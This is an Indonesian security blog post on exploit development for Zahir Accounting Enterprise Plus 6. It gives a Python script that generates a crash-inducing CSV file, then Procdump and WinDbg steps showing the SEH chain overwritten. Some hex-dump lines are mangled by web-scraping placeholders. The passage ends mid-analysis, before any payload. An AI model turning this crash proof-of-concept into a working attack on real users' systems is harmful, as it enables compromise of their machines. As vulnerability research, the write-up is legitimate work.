<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<title>Zahir Accounting Enterprise Plus 6 &lt;&#x3D; build 10b 0day Exploit Vulnerability Discovery</title>
<meta name="HandheldFriendly" content="True" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=64d14f1267" />
<link rel="icon" href="/favicon.png" type="image/png" />
<link rel="canonical" href="https://blog.spentera.id/zahir-accounting-enterprise-plus-6/" />
<meta name="referrer" content="no-referrer-when-downgrade" />
<link rel="amphtml" href="https://blog.spentera.id/zahir-accounting-enterprise-plus-6/amp/" />
<meta property="og:site_name" content="Spentera Blog" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Zahir Accounting Enterprise Plus 6 &lt;&#x3D; build 10b 0day Exploit Vulnerability Discovery" />
<meta property="og:description" content="Zahir Accounting adalah software akuntansi yang sangat banyak digunakan oleh tingkatan SOHO (Small Office Home Office) di Indonesia. Selain harganya yang terjangkau, Zahir memiliki fitur yang lebih dari cukup untuk menyelesaikan pencatatan akuntansi yang tanggung, dalam arti mampu menyisir tingkat menengah ke bawah dan juga mampu menghadapi tantangan akuntansi yang" />
<meta property="og:url" content="https://blog.spentera.id/zahir-accounting-enterprise-plus-6/" />
<meta property="og:image" content="https://blog.spentera.id/content/images/wordpress/2018/10/zahir6_1.png" />
<meta property="article:published_time" content="2018-10-01T16:16:37.000Z" />
<meta property="article:modified_time" content="2020-05-13T15:11:01.000Z" />
<meta property="article:tag" content="Exploit Development" />
<meta property="article:publisher" content="https://www.facebook.com/spentera" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Zahir Accounting Enterprise Plus 6 &lt;&#x3D; build 10b 0day Exploit Vulnerability Discovery" />
<meta name="twitter:description" content="Zahir Accounting adalah software akuntansi yang sangat banyak digunakan oleh tingkatan SOHO (Small Office Home Office) di Indonesia. Selain harganya yang terjangkau, Zahir memiliki fitur yang lebih dari cukup untuk menyelesaikan pencatatan akuntansi yang tanggung, dalam arti mampu menyisir tingkat menengah ke bawah dan juga mampu menghadapi tantangan akuntansi yang" />
<meta name="twitter:url" content="https://blog.spentera.id/zahir-accounting-enterprise-plus-6/" />
<meta name="twitter:image" content="https://blog.spentera.id/content/images/wordpress/2018/10/zahir6_1.png" />
<meta name="twitter:label1" content="Written by" />
<meta name="twitter:data1" content="Thomas Gregory" />
<meta name="twitter:label2" content="Filed under" />
<meta name="twitter:data2" content="Exploit Development" />
<meta name="twitter:site" content="@spentera" />
<meta name="twitter:creator" content="@modpr0be" />
<meta property="og:image:width" content="993" />
<meta property="og:image:height" content="713" />
<script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Spentera Blog",
        "url": "https://blog.spentera.id/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.spentera.id/content/images/2020/05/Spentera-Logo-4.png"
        }
    },
    "author": {
        "@type": "Person",
        "name": "Thomas Gregory",
        "image": {
            "@type": "ImageObject",
            "url": "//www.gravatar.com/avatar/3fc41f3ca052406ed922ede359c97b86?s=250&d=mm&r=x",
            "width": 250,
            "height": 250
        },
        "url": "https://blog.spentera.id/author/modpr0be/",
        "sameAs": [
            "https://blog.modpr0.be",
            "https://twitter.com/modpr0be"
        ]
    },
    "headline": "Zahir Accounting Enterprise Plus 6 &lt;&#x3D; build 10b 0day Exploit Vulnerability Discovery",
    "url": "https://blog.spentera.id/zahir-accounting-enterprise-plus-6/",
    "datePublished": "2018-10-01T16:16:37.000Z",
    "dateModified": "2020-05-13T15:11:01.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://blog.spentera.id/content/images/wordpress/2018/10/zahir6_1.png",
        "width": 993,
        "height": 713
    },
    "keywords": "Exploit Development",
    "description": "Zahir Accounting adalah software akuntansi yang sangat banyak digunakan oleh\ntingkatan SOHO (Small Office Home Office) di Indonesia. Selain harganya yang\nterjangkau, Zahir memiliki fitur yang lebih dari cukup untuk menyelesaikan\npencatatan akuntansi yang tanggung, dalam arti mampu menyisir tingkat menengah\nke bawah dan juga mampu menghadapi tantangan akuntansi yang hampir mendekati\ntingkatenterprise.\n\nPada kesempatan kali ini, Zahir Accounting masuk di laboratorium riset 0-day\nSpentera yang foku",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://blog.spentera.id/"
    }
}
    </script>
<meta name="generator" content="Ghost 3.33" />
<link rel="alternate" type="application/rss+xml" title="Spentera Blog" href="https://blog.spentera.id/rss/" />
</head>
<body class="post-template tag-exploit-development">
<div class="site-wrapper">
<header class="site-header">
<div class="outer site-nav-main">
<div class="inner">
<nav class="site-nav">
<div class="site-nav-left-wrapper">
<div class="site-nav-left">
<a class="site-nav-logo" href="https://blog.spentera.id"><img src="/content/images/2020/05/Spentera-Logo-4.png" alt="Spentera Blog" /></a>
<div class="site-nav-content">
<ul class="nav">
<li class="nav-home"><a href="https://blog.spentera.id/">Home</a></li>
<li class="nav-cyber-threat-intelligence"><a href="https://blog.spentera.id/tag/cyber-threat-intelligence/">Cyber Threat Intelligence</a></li>
<li class="nav-exploit-development"><a href="https://blog.spentera.id/tag/exploit-development/">Exploit Development</a></li>
<li class="nav-security-advisory"><a href="https://blog.spentera.id/tag/security-advisory/">Security Advisory</a></li>
<li class="nav-disclaimer"><a href="https://blog.spentera.id/disclaimer/">Disclaimer</a></li>
<li class="nav-about-us"><a href="https://blog.spentera.id/about-us/">About Us</a></li>
</ul>
<span class="nav-post-title ">Zahir Accounting Enterprise Plus 6 &lt;&#x3D; build 10b 0day Exploit Vulnerability Discovery</span>
</div>
</div>
</div>
<div class="site-nav-right">
<div class="social-links">
<a class="social-link social-link-fb" href="https://www.facebook.com/spentera" title="Facebook" target="_blank" rel="noopener"><svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M16 0c8.837 0 16 7.163 16 16s-7.163 16-16 16S0 24.837 0 16 7.163 0 16 0zm5.204 4.911h-3.546c-2.103 0-4.443.885-4.443 3.934.01 1.062 0 2.08 0 3.225h-2.433v3.872h2.509v11.147h4.61v-11.22h3.042l.275-3.81h-3.397s.007-1.695 0-2.187c0-1.205 1.253-1.136 1.329-1.136h2.054V4.911z" /></svg></a>
<a class="social-link social-link-tw" href="https://twitter.com/spentera" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z" /></svg>
</a>
</div>
<a class="rss-button" href="https://feedly.com/i/subscription/feed/https://blog.spentera.id/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18" /><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z" /></svg>
</a>
</div>
</nav>
</div>
</div></header>
<main id="site-main" class="site-main outer">
<div class="inner">
<article class="post-full post tag-exploit-development ">
<header class="post-full-header">
<section class="post-full-tags">
<a href="/tag/exploit-development/">Exploit Development</a>
</section>
<h1 class="post-full-title">Zahir Accounting Enterprise Plus 6 &lt;&#x3D; build 10b 0day Exploit Vulnerability Discovery</h1>
<div class="post-full-byline">
<section class="post-full-byline-content">
<ul class="author-list">
<li class="author-list-item">
<div class="author-card">
<img class="author-profile-image" src="//www.gravatar.com/avatar/3fc41f3ca052406ed922ede359c97b86?s&#x3D;250&amp;d&#x3D;mm&amp;r&#x3D;x" alt="Thomas Gregory" />
<div class="author-info">
<h2>Thomas Gregory</h2>
<p>Read <a href="/author/modpr0be/">more posts</a> by this author.</p>
</div>
</div>
<a href="/author/modpr0be/" class="author-avatar">
<img class="author-profile-image" src="//www.gravatar.com/avatar/3fc41f3ca052406ed922ede359c97b86?s&#x3D;250&amp;d&#x3D;mm&amp;r&#x3D;x" alt="Thomas Gregory" />
</a>
</li>
</ul>
<section class="post-full-byline-meta">
<h4 class="author-name"><a href="/author/modpr0be/">Thomas Gregory</a></h4>
<div class="byline-meta-content">
<time class="byline-meta-date" datetime="2018-10-01">1 Oct 2018</time>
<span class="byline-reading-time"><span class="bull">&bull;</span> 18 min read</span>
</div>
</section>
</section>
</div>
</header>
<figure class="post-full-image">
<img srcset="/content/images/size/w300/wordpress/2018/10/zahir6_1.png 300w,
                            /content/images/size/w600/wordpress/2018/10/zahir6_1.png 600w,
                            /content/images/size/w1000/wordpress/2018/10/zahir6_1.png 1000w,
                            /content/images/size/w2000/wordpress/2018/10/zahir6_1.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="/content/images/size/w2000/wordpress/2018/10/zahir6_1.png" alt="Zahir Accounting Enterprise Plus 6 &lt;&#x3D; build 10b 0day Exploit Vulnerability Discovery" />
</figure>
<section class="post-full-content">
<div class="post-content">
<p>Zahir Accounting adalah software akuntansi yang sangat banyak digunakan oleh tingkatan SOHO (Small Office Home Office) di Indonesia. Selain harganya yang terjangkau, Zahir memiliki fitur yang lebih dari cukup untuk menyelesaikan pencatatan akuntansi yang tanggung, dalam arti mampu menyisir tingkat menengah ke bawah dan juga mampu menghadapi tantangan akuntansi yang hampir mendekati tingkat <em>enterprise. </em></p>
<p>Pada kesempatan kali ini, Zahir Accounting masuk di laboratorium riset 0-day Spentera yang fokus pada aplikasi-aplikasi yang dihasilkan oleh anak negeri. Mengingat profil Zahir yang cukup terkenal, merupakan tantangan dan kebanggaan tersendiri bagi kami untuk membedahnya.</p>
<h2>Lingkungan Riset dan Tool yang Digunakan</h2>
<p>Proses <em>vulnerability discovery</em> ini dilakukan pada sistem operasi Windows 7 dengan beberapa tool yang akan kita gunakan sebagai berikut:</p>
<ul>
<li><a href="https://www.immunityinc.com/products/debugger/" target="_blank" rel="noopener">Immunity Debugger</a></li>
<li><a href="https://www.microsoft.com/en-us/download/details.aspx?displaylang=en&amp;id=8279" target="_blank" rel="noopener">Debugging Tools for Windows</a></li>
<li><a href="https://github.com/corelan/mona" target="_blank" rel="noopener">Mona.py</a></li>
<li><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">Metasploit Framework</a></li>
<li><a href="https://download.sysinternals.com/files/Procdump.zip">Procdump</a> (bagian dari <a href="https://download.sysinternals.com/files/SysinternalsSuite.zip">Sysinternal Suite</a>)</li>
<li>
<div><a href="https://msecdbg.codeplex.com/" target="_blank" rel="noopener">!exploitable Crash Analyzer &#8211; MSEC Debugger Extensions</a></div>
</li>
</ul>
<h2>Fuzzing Aplikasi</h2>
<p>Seperti biasa proses awal sebuah <em>vulnerability discovery</em> pada aplikasi diawali oleh yang namanya <em>fuzzing. </em>Proses ini biasanya memakan waktu yang lama, tergantung besaran <em>entry point</em> yang terdapat pada aplikasi. Karena aplikasi Zahir merupakan aplikasi klien (bukan aplikasi server yang menjalankan service dan membuka port), maka tehnik yang kami gunakan adalah pendekatan <em>file format </em><em>fuzzing. </em>Tehnik ini mencoba mencari kerentanan dari sisi input yang akan di proses oleh aplikasi, sisi input ini yang kami sebut juga dengan <em>entry point</em>. Pada aplikasi Zahir, terdapat beberapa <em>entry point </em>berikut:</p>
<ul>
<li>Menu Buka Data, fungsi untuk membaca database lokal atau dari layanan database Firebird.</li>
<li>Menu Membuka File Backup, fungsi untuk membuka file backup yang sudah ada</li>
<li>Menu Import Data dari Zahir versi 6.0, membuka data dari versi Zahir sebelumnya.</li>
<li>Menu Import Data dari file lainnya, membuka data dari file berformat CSV.</li>
<li>Menu Import Transaksi, membuka data dari file berformat CSV.</li>
</ul>
<p>Percobaan <em>fuzzing </em>dilakukan dengan cara mengisi file berformat CSV dengan karakter &#8220;A&#8221; lalu di inputkan ke dalam program Zahir. Dari semua percobaan <em>fuzzing </em>yang telah dilakukan dengan cara membuat file berformat CSV, fungsi Import Data dari file lainnya-lah yang bereaksi terhadap file CSV yang berisi karakter &#8220;A&#8221; sebanyak 5000 karakter. Berikut adalah skrip yang digunakan untuk menghasilkan file tersebut.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python

junk = "A" * 2500
junk += '\n\r'
junk += 'A' * 500
junk += "D" * 500

print "[+] Preparing for file.."
filename = "junk.csv"
f = open(filename, 'w')
print "[+] Writing crafted CSV file.."
f.write(junk)
f.close()
print "[+] File %s written successfully.. bring it to Mr. Zahir." %filename</pre>
<p>Jika diperhatikan ada karakter &#8216;\n\r&#8217; yang disematkan antar karakter &#8220;A&#8221; yang akan dihasilkan. Karakter &#8216;\n&#8217; biasa kita kenal dengan <em>newline</em> atau <em>Line Feed</em> (LF), sedangkan karakter &#8216;\r&#8217; yang berarti <em>Carriage Return</em> (CR). Informasi mengenai CR LF dapat dilihat <a href="https://en.wikipedia.org/wiki/Newline">disini</a>.</p>
<p>Dalam beberapa kali percobaan, rupanya program Zahir mengalami kegagalan dalam memproses CR LF ini sehingga menyebabkan program Zahir <em>crash</em>. Untuk memicu error tersebut, kita bisa membuka file junk.csv dari menu File &#8211; Import &#8211; Import Data dari File Lainnya &#8211; Pilih Lanjutkan &#8211; Pada menu selanjutnya pilih salah satu, saya memilih Daftar Pelanggan &#8211; Lalu pada form Nama File, pilih file junk.csv yang telah dihasilkan oleh skrip di atas &#8211; Lalu pilih Lanjutkan.</p>
<p><a href="https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/crash.png"><img class="alignnone size-full wp-image-2265" src="https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/crash.png?resize=600%2C228" alt="" width="600" height="228" srcset="https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/crash.png?w=2878&amp;ssl=1 2878w, https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/crash.png?resize=300%2C114&amp;ssl=1 300w, https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/crash.png?resize=768%2C291&amp;ssl=1 768w, https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/crash.png?resize=1024%2C389&amp;ssl=1 1024w, https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/crash.png?w=1200&amp;ssl=1 1200w, https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/crash.png?w=1800&amp;ssl=1 1800w" sizes="(max-width: 600px) 100vw, 600px" data-recalc-dims="1" /></a></p>
<p>Terlihat bahwa terdapat pesan error</p>
<pre>Error: Access violation at 0x77D5283E (tried to write to 0x0030FE4), program terminated. LastCP is 'RF'.</pre>
<p>Pada pesan error juga terdapat <em>hint</em> (LastCP is &#8216;RF&#8217;) yang menjelaskan bahwa <em>crash</em> tersebut terjadi karena CR LF.</p>
<p><a href="https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/crash2.png"><img class="alignnone wp-image-115 size-full" src="https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/crash2.png?resize=600%2C227" alt="" width="600" height="227" data-recalc-dims="1" /></a></p>
<h2>Proses Debugging</h2>
<p>Berdasarkan informasi tersebut, kita perlu tahu apa yang sebenarnya terjadi ketika file CSV hasil <em>fuzzing </em>(junk.csv) tersebut diproses oleh Zahir. Proses ini biasa kita namakan dengan <em>debugging </em>dan tool untuk debugging kali ini kita akan menggunakan Immunity Debugger. Seperti proses debugging pada umumnya, kita akan menjalankan Immunity Debugger dan membuka program Zahir dengan Immunity Debugger. Namun developer Zahir sepertinya tidak ingin programnya dapat di <em>reverse engineering</em> atau <em>debugging</em>, sehingga ketika kita buka dengan Immunity Debugger, muncul tampilan seperti berikut.</p>
<p><a href="https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/anti-debug.png"><img class="wp-image-119 aligncenter" src="https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/anti-debug.png?resize=600%2C144" alt="" width="600" height="144" data-recalc-dims="1" /></a></p>
<p>Ketika menemukan error seperti ini, maka proses <em>debugging</em> tidak akan bisa kita lakukan dengan cara membuka program dengan <em>debugger</em>. Ada 2 cara lain jika kita menemukan keadaan seperti ini:</p>
<ol>
<li>Lakukan <em>debugging </em>dengan cara <em>attaching</em> proses ZahirApp6.exe, tentu saja kita harus jalankan program Zahir dulu sampai semua program tersebut berjalan dengan sempurna, setelah itu kita <em>attach </em>(File &#8211; Attach) proses ZahirApp6.exe dengan Debugger. Namun, cara pertama ini gagal karena developer Zahir sukses menghindari <em>attaching process</em> oleh debugger, sehingga ketika file CSV <em>fuzzing </em>(junk.csv) di buka, program tetap <em>crash </em>namun debugger tidak dapat &#8216;menangkap&#8217; proses <em>crash</em> yang terjadi.</li>
<li>Menangkap<em> crash dump </em>yang dihasilkan ketika Zahir <em>crash</em> dengan file CSV <em>fuzzing</em> (junk.csv) yang sudah kita input ke Zahir. Untuk &#8216;menangkap&#8217; informasi <em>crash</em> tersebut, dibutuhkan program tambahan yang bernama Procdump.</li>
</ol>
<h2>Crash Dump Analysis</h2>
<p>Untuk mendapatkan informasi lebih detail terhadap <em>crash dump </em>yang dihasilkan, kita perlu mengatur bagaimana Procdump dapat menangkap <em>crash </em>dari program Zahir. Untuk itu kita akan menggunakan Procdump dengan perintah berikut:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">mkdir c:\crashdump
cd C:\tools\SysinternalsSuite
procdump.exe -ma -I C:\crashdump</pre>
<p>Penjelasan tentang perintah di atas:</p>
<ul>
<li>mkdir C:\crashdump, kita membuat tempat dimana procdump akan melempar hasil crash program.</li>
<li>procdump -ma -I C:\crashdump, yang berarti menuliskan &#8216;Full&#8217; dump apabila program crash ke folder C:\crashdump serta jadikan procdump sebagai AEDebug <em>postmortem</em> <em>debugger</em> yang artinya Procdump akan selalu menjadi<em> </em>program yang pertama kali dianggap sebagai debugger oleh sistem operasi.</li>
</ul>
<p>Setelah Procdump siap, kita akan jalankan kembali program Zahir dan membuka kembali file CSV <em>fuzzing </em>(junk.csv) yang sudah kita siapkan. Kali ini, Procdump akan mencatat semua proses crash dan dapat kita analisa menggunakan Windows Debugger (WinDbg).</p>
<p><a href="https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/procdump-collecting.png"><img class="wp-image-120 aligncenter" src="https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/procdump-collecting.png?resize=600%2C390" alt="" width="600" height="390" data-recalc-dims="1" /></a></p>
<p>Setelah tampilan error CR LF yang sebelumnya kita lihat, muncul window baru dimana Procdump melakukan tugasnya mengumpulkan proses crash yang sedang terjadi. Apabila kita lihat di C:\crashdump, kita bisa lihat 2 buah file telah dihasilkan oleh Procdump.</p>
<p><a href="https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/crashdump-files.png"><img class="wp-image-121 aligncenter" src="https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/crashdump-files.png?resize=600%2C184" alt="" width="600" height="184" data-recalc-dims="1" /></a><br />
Untuk menganalisa kedua file ini, kita memerlukan Windows Debugger (WinDbg)</p>
<h2>Analisa Crash Dump dengan WinDbg</h2>
<p>Buka program WinDbg lalu pilih File &#8211; Open Crash Dump, pilih salah satu dari kedua file crash dump tersebut. Kita akan melihat pada Command window bahwa proses berhenti ketika terjadi exception yang kemudian ditangkap oleh Structured Exception Handler (SEH), hal ini dapat kita simpulkan dari module DLL dimana proses exception tersebut terjadi (ntdll_!_SEH_prolog4+0x1a). Jika ingin melihat dari sisi disassembler, pilih View &#8211; Disassembly.</p>
<p><a href="https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/windbg-1.png"><img class="wp-image-122 aligncenter" src="https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/windbg-1.png?resize=600%2C693" alt="" width="600" height="693" data-recalc-dims="1" /></a></p>
<p>Apabila kita lihat pada hasil <em>crash dump</em> di atas terdapat kalimat &#8220;This dump file has an exception of interest stored in it. The stored exception information can be accessed via .ecxr.&#8221;</p>
<p>Jika kita lihat menggunakan !analyze -v:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">0:000&gt; !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

Failed calling InternetOpenUrl, GLE=12029

FAULTING_IP: 
Zahir!LbcsvRegister$qqrv+49
02504375 f366a5          rep movs word ptr es:[edi],word ptr [esi]

EXCEPTION_RECORD:  0012e600 -- (.exr 0x12e600)
ExceptionAddress: 02504375 (Zahir!LbcsvRegister$qqrv+0x00000049)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000001
   Parameter[1]: 82828282
Attempt to write to address 82828282

PROCESS_NAME:  ZahirApp6.exe
ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
EXCEPTION_PARAMETER1:  00000001
EXCEPTION_PARAMETER2:  00030fe4
WRITE_ADDRESS:  00030fe4 
FOLLOWUP_IP: 
Zahir!LbcsvRegister$qqrv+0
0250432c 51              push    ecx
MOD_LIST: 
NTGLOBALFLAG:  0

APPLICATION_VERIFIER_FLAGS:  0

FAILED_INSTRUCTION_ADDRESS: 
+69382faf0387de5c
44444444 ??              ???

CONTEXT:  0012e61c -- (.cxr 0x12e61c)
eax=0012eab4 ebx=00000000 ecx=0000007f edx=82828282 esi=0012eab4 edi=82828282
eip=02504375 esp=0012ea74 ebp=0012ea8c iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203
Zahir!LbcsvRegister$qqrv+0x49:
02504375 f366a5          rep movs word ptr es:[edi],word ptr [esi]
Resetting default scope

ADDITIONAL_DEBUG_TEXT:  Followup set based on attribute [Is_ChosenCrashFollowupThread] from Frame:[0] on thread:[PSEUDO_THREAD]
LAST_CONTROL_TRANSFER:  from 0250483b to 02504375
FAULTING_THREAD:  ffffffff
BUGCHECK_STR:  APPLICATION_FAULT_INVALID_STACK_ACCESS_INVALID_POINTER_WRITE_FILL_PATTERN_44444444
PRIMARY_PROBLEM_CLASS:  INVALID_STACK_ACCESS_FILL_PATTERN_44444444
DEFAULT_BUCKET_ID:  INVALID_STACK_ACCESS_FILL_PATTERN_44444444

IP_ON_HEAP:  44444444
The fault address in not in any loaded module, please check your build's rebase
log at \bin\build_logs\timebuild\ntrebase.log for module which may
contain the address if it were loaded.

IP_IN_FREE_BLOCK: 44444444

STACK_TEXT:  
0012ea74 02504375 zahir!LbcsvRegister$qqrv+0x49
0012ea94 0250483b zahir!LbcsvTLbCsvGetRecord$qqrpc11DbTGetModeo+0x13f
0012ebd0 41414141 unknown!printable+0x0
0012ebd4 41414141 unknown!printable+0x0
0012ebd8 41414141 unknown!printable+0x0
0012ebdc 41414141 unknown!printable+0x0
0012ebe0 41414141 unknown!printable+0x0
0012ebe4 41414141 unknown!printable+0x0
0012ebe8 41414141 unknown!printable+0x0
0012ebec 41414141 unknown!printable+0x0
0012ebf0 41414141 unknown!printable+0x0
0012ebf4 41414141 unknown!printable+0x0
0012ebf8 41414141 unknown!printable+0x0
0012ebfc 41414141 unknown!printable+0x0
0012ec00 41414141 unknown!printable+0x0
0012ec04 41414141 unknown!printable+0x0
0012ec08 41414141 unknown!printable+0x0
0012ec0c 41414141 unknown!printable+0x0
0012ec10 41414141 unknown!printable+0x0
0012ec14 41414141 unknown!printable+0x0

STACK_COMMAND:  .cxr 0012E61C ; kb ; dt ntdll!LdrpLastDllInitializer BaseDllName ; dt ntdll!LdrpFailureData ; dds 12ea74 ; kb
SYMBOL_NAME:  zahir!LbcsvRegister$qqrv+0
FOLLOWUP_NAME:  MachineOwner
MODULE_NAME: Zahir
IMAGE_NAME:  Zahir.bpl
DEBUG_FLR_IMAGE_TIMESTAMP:  2a425e19
FAILURE_BUCKET_ID:  INVALID_STACK_ACCESS_FILL_PATTERN_44444444_c0000005_Zahir.bpl!LbcsvRegister$qqrv
BUCKET_ID:  APPLICATION_FAULT_INVALID_STACK_ACCESS_INVALID_POINTER_WRITE_FILL_PATTERN_44444444_BAD_IP_zahir!LbcsvRegister$qqrv+0
WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/ZahirApp6_exe/6_0_0_1/2a425e19/ntdll_dll/6_1_7601_23889/598d4ce7/c0000005/0005283e.htm?Retriage=1
Followup: MachineOwner
---------</pre>
<p>Exception record menunjukkan bahwa exception terjadi pada alamat 0012e600. Kita bisa lihat proses exception terjadi dengan perintah berikut.</p>
<pre>0:000&gt; d fs:[0]
003b:00000000  <span style="color: #ff0000;"><strong>6c 15 03 00</strong></span> 00 00 13 00-00 10 03 00 00 00 00 00 l...............
003b:00000010  00 1e 00 00 00 00 00 00-00 f0 fd 7f 00 00 00 00 ................
003b:00000020  88 03 00 00 cc 0c 00 00-00 00 00 00 c0 68 25 00 .............h%.
003b:00000030  00 e0 fd 7f 00 00 00 00-00 00 00 00 00 00 00 00 ................
003b:00000040  28 62 f4 fd 00 00 00 00-00 00 00 00 00 00 00 00 (b..............
003b:00000050  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
003b:00000060  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
003b:00000070  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0:000&gt; d 0003156c
0003156c  <span style="color: #ff0000;"><strong>ac 1a 03 00</strong></span> 8d 6d 0a 77-30 ec 12 00 28 16 03 00  .....m.w0...(...
0003157c  4b 6d 0a 77 40 16 03 00-30 ec 12 00 5c 16 03 00  <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="94dff9bae3d4bababaa4bababa">[email&#160;protected]</a>\...
0003158c  14 16 03 00 44 44 44 44-30 ec 12 00 40 16 03 00  <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2e000000006a6a6a6a1e0000006e000000">[email&#160;protected]</a>
0003159c  30 ec 12 00 17 fa 07 77-40 16 03 00 30 ec 12 00  <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="eadac4c4c4c4c4c49daac4c4c4dac4c4c4">[email&#160;protected]</a>
000315ac  5c 16 03 00 14 16 03 00-44 44 44 44 00 00 00 00  \.......DDDD....
000315bc  40 16 03 00 00 00 00 00-00 00 00 00 00 00 00 00  @...............
000315cc  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
000315dc  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0:000&gt; d 00031aac
00031aac  <span style="color: #ff0000;"><strong>ec 1f 03 00</strong></span> 8d 6d 0a 77-30 ec 12 00 68 1b 03 00  .....m.w0...h...
00031abc  4b 6d 0a 77 80 1b 03 00-30 ec 12 00 9c 1b 03 00  Km.w....0.......
00031acc  54 1b 03 00 44 44 44 44-30 ec 12 00 80 1b 03 00  T...DDDD0.......
00031adc  30 ec 12 00 17 fa 07 77-80 1b 03 00 30 ec 12 00  0......w....0...
00031aec  9c 1b 03 00 54 1b 03 00-44 44 44 44 00 00 00 00  ....T...DDDD....
00031afc  80 1b 03 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00031b0c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00031b1c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0:000&gt; d 00031fec
00031fec  <strong><span style="color: #ff0000;">2c 25 03 00</span></strong> 8d 6d 0a 77-30 ec 12 00 a8 20 03 00  ,%...m.w0.... ..
00031ffc  4b 6d 0a 77 c0 20 03 00-30 ec 12 00 dc 20 03 00  Km.w. ..0.... ..
0003200c  94 20 03 00 44 44 44 44-30 ec 12 00 c0 20 03 00  . ..DDDD0.... ..
0003201c  30 ec 12 00 17 fa 07 77-c0 20 03 00 30 ec 12 00  0......w. ..0...
0003202c  dc 20 03 00 94 20 03 00-44 44 44 44 00 00 00 00  . ... ..DDDD....
0003203c  c0 20 03 00 00 00 00 00-00 00 00 00 00 00 00 00  . ..............
0003204c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0003205c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0:000&gt; d 0003252c
0003252c  <strong><span style="color: #ff0000;">6c 2a 03 00</span></strong> 8d 6d 0a 77-30 ec 12 00 e8 25 03 00  l*...m.w0....%..
